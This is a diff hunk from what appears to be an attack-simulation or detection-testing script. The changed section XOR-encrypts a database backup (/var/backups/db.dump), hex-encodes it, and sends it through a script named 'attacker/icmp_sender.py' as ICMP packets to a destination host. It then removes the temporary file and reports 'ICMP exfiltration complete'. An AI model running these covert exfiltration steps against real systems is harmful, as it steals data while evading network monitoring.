@@ -150,7 +150,7 @@ xor_file /var/backups/db.dump /tmp/.u4.xor "$ICMP_KEY"
 echo "  Hex encoding..."
 xxd -p /tmp/.u4.xor | tr -d '\n' > /tmp/.hex
 echo "  Sending ICMP packets..."
-python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 || true
+SCAPY_SUPPRESS_LAYERS=mspac python3 "$ROOT/attacker/icmp_sender.py" --hex-file /tmp/.hex --dest "$ICMP_IP" --chunk-size 56 || true
 rm -f /tmp/.u4.xor
 echo "  [✓] ICMP exfiltration complete"
 benign
